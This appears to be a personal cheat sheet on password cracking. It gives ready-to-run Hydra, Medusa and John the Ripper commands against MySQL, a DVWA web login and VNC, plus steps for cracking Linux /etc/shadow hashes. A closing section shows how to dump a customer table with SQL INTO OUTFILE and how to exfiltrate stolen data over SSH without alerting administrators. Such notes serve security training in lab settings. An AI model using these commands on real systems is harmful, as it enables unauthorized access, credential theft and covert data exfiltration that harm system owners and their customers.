#Password Cracking

##Methods of Password Cracking
Brute force attack
Dictionary attacks
Rainbow table						//faster and uses a lot of RAM


1.Hydra:-
hydra -l root -P abc.txt mysql://192.168.10.11				//brute forcing with the root username and password file with the service mysql and its ip address

To interact with mysql 				//mysql -u root -p -h 192.168.10.11
show databases;						//list all the databases in the mysql
use dvwa;							//now use database and so on

##Online Password cracking attack performed by Hydra
hydra -l [username] -p [password] 192.168.10.12 http-post-form(we get this details from the burpsuite) "dvwa/login/.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -f(exit at first result)


2.John The Ripper:-
>>Password cracking of users--
Save the content of /etc/passwd into one file named "passwd"
Save the content of /etc/shadow into one file named "shadow"
Then , unshadow passwd shadow > file_crack
and this will merge both of the files into one to crack easily
john file_crack								//this will crack the password
john file_crack --show						//this will show the cracked password

>>Normal cracking of Hash file--
john --wordlist=/usr/share/wordlist /root/Desktop/hashes.txt
and thus it starts cracking
if john gets the password it stores in the "john.pot"
To find it, type "find / -name john.pot


3.Medusa:-
medusa -h 192.168.29.2 -U /root/usernames.txt -P /root/Password.txt -M vnc 	//cracking passwords using medusa where we can provide the usernames and passwords
When we got the success we can break the sequence to get usernames and passwords
To connect to vnc we can use--
xtightvncviewer 192.168.29.2    and then the password and thus we got the root access to the machine 

4.Cain and Abel					//Ms windows password recovery tool and gets the password


#Format of password saved in OS
administrator:500:sfhaklhflsthfailwghi23:kehfoiwhr248wr0upt3ur0sopf
username:userid:LM hash:NTLM hash								//windows


etc/shadow												//linux
root:$5$sfhkht$egsklehgskeghyh:552662:0:9999:7:::
username:$algorithm of encryption(sha256//$5$)$salt$hash:last changed time:Min:Max:Warn





#Cracking password---
hashkiller.co.uk				//website where we can decrypt the NTLM hashes by pasting the hashes to the browser
ophcrack
md5sum							//lets you convert your normal text to md5 hash(feature in terminal)


Tips for better password---
https connections
no simple password
never save your password
email password should be the toughest one



***************************************************************************************************
#Extra
Now the bad guy wants to dump all the passwords and then take back to its computer safely
select * from customers into outfile '/tmp/cc.txt'				//dumping the table records


Smart attackers will not download the big file in one go as this will alert the administrator and also they will try to download using ssh where all the traffic will be encrypted and the administrators will mostly ignore the encrypted traffic and thus their work will be done
